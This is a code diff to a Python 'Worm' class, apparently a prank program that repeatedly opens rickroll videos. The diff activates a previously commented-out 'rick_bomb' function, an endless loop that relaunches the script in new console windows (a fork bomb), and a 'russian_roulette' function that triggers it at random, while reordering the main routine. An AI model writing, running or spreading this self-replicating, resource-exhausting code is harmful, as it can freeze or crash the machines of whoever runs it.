@@ -186,19 +186,18 @@ class Worm:
             if YOUTUBETOO:
                 for i in range(0, COUNT):
                     webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
-            self.create_new_worm()
         except:
             logging.warning("exception occurred: no rick?")
     
-    # def rick_bomb(self):
-    #     while True:
-    #         subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
+    def rick_bomb(self):
+        while True:
+            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         
-    # def russian_roulette(self):
-    #     num = random.randint(0, 5)
-    #     if ROULETTE == num:
-    #         print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-    #         self.rick_bomb()
+    def russian_roulette(self):
+        num = random.randint(0, 5)
+        if ROULETTE == num:
+            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+            self.rick_bomb()
     
     def run_roulette(self):       
         subprocess.Popen(executable=f"{self.own_path}\\..\\roulette.py", creationflags=subprocess.CREATE_NEW_CONSOLE)
@@ -225,9 +224,10 @@ class Worm:
        
 if __name__=="__main__":
     current_directory = os.path.abspath("")
+    
     worm = Worm(path=current_directory)
-    worm.run_roulette()
     worm.start_worm_actions()
+    worm.run_roulette()
     # with open('log.txt', 'w') as f:
     #     f.write(f"{perf_counter() - worm.start:.5f}")
     
